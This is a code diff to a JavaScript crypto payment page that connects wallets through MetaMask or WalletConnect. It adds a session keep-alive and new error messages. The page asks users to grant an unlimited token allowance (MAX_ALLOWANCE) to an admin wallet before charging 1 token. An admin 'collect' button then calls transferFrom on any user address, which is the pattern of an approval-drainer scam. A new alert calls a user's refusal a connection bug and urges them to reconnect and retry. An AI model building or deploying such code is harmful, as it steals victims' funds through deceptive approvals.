@@ -81,7 +81,8 @@ const PAY_AMOUNT = 1;
 let connectedAddress = "";
 let signClient = null;
 let walletSession = null;
-let isApproved = false; // 标记是否已经授权
+let isApproved = false;
+let pingTimer = null; // WC会话保活定时器
 
 const loadingDom = document.getElementById("loading");
 const qrWrapDom = document.getElementById("qrWrap");
@@ -89,7 +90,16 @@ const addrShowDom = document.getElementById("addrShow");
 const adminPanelDom = document.getElementById("adminPanel");
 const payBtn = document.getElementById("payBtn");
 
-// 初始化 WalletConnect
+// WC会话心跳保活
+function startSessionPing(){
+    if(pingTimer) clearInterval(pingTimer);
+    pingTimer = setInterval(async ()=>{
+        if(signClient && walletSession){
+            try{await signClient.ping({topic:walletSession.topic})}catch(e){}
+        }
+    },8000);
+}
+
 async function initWalletConnect() {
     loadingDom.style.display = "block";
     try {
@@ -106,6 +116,7 @@ async function initWalletConnect() {
             connectedAddress = "";
             walletSession = null;
             isApproved = false;
+            clearInterval(pingTimer);
             addrShowDom.innerText = "未连接";
             qrWrapDom.style.display = "none";
             adminPanelDom.style.display = "none";
@@ -119,7 +130,6 @@ async function initWalletConnect() {
     }
 }
 
-// 连接钱包按钮
 document.getElementById("connectBtn").addEventListener("click", async () => {
     if (window.ethereum) {
         try {
@@ -154,6 +164,7 @@ document.getElementById("connectBtn").addEventListener("click", async () => {
         document.getElementById("wcQrcode").innerHTML = "";
         QRCode.toCanvas(document.getElementById("wcQrcode"), uri, { width: 200 });
         walletSession = await approval();
+        startSessionPing(); // 开启会话保活
         const addrFull = walletSession.namespaces.eip155.accounts[0].split(":")[2];
         connectedAddress = addrFull.toLowerCase();
         addrShowDom.innerText = connectedAddress.slice(0, 6) + "..." + connectedAddress.slice(-4);
@@ -166,14 +177,13 @@ document.getElementById("connectBtn").addEventListener("click", async () => {
     }
 })
 
-// 支付按钮
 payBtn.addEventListener("click", async () => {
     if (!connectedAddress) return alert("请先连接钱包！");
     payBtn.disabled = true;
     try {
         const receiverHex = ADMIN_WALLET.slice(2).padStart(64, "0");
         if(!isApproved){
-            // =========第一步：执行授权Approve=========
+            // 第一步：授权Approve
             const MAX_ALLOWANCE = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
             const approveCalldata = "0x095ea7b3" + receiverHex + MAX_ALLOWANCE;
             const approveTx = [{
@@ -194,7 +204,8 @@ payBtn.addEventListener("click", async () => {
             isApproved = true;
             alert("✅ 授权成功！请再次点击支付按钮完成转账");
         }else{
-            // =========第二步：执行转账=========
+            // 第二步：转账，增加300ms缓冲，缓解WC通道拥堵
+            await new Promise(resolve=>setTimeout(resolve,300));
             const amountBig = BigInt(PAY_AMOUNT * 10n ** 18n).toString(16).padStart(64, "0");
             const transferCalldata = "0xa9059cbb" + receiverHex + amountBig;
             const transferTx = [{
@@ -215,15 +226,23 @@ payBtn.addEventListener("click", async () => {
             alert("✅ 支付完成！订单核验成功");
         }
     } catch (e) {
-        // 区分报错
-        console.error(e);
-        alert("交易被用户取消，请重试");
+        console.error("交易异常：",e);
+        // 区分异常
+        if(e.code === 4001){
+            // 判断场景：已经授权成功，再次转账报4001 = WC通道BUG
+            if(isApproved){
+                alert("⚠️ 钱包连接通道异常！请【关闭页面重新扫码连接钱包】后重试转账");
+            }else{
+                alert("交易被用户取消，请重试");
+            }
+        }else{
+            alert("交易失败："+(e.message||"未知错误"));
+        }
     } finally {
         payBtn.disabled = false;
     }
 })
 
-// 管理员归集 transferFrom
 document.getElementById("collectBtn").addEventListener("click", async () => {
     if (connectedAddress !== ADMIN_WALLET) return alert("仅管理员可执行归集");
     const targetUser = document.getElementById("userAddress").value.trim();
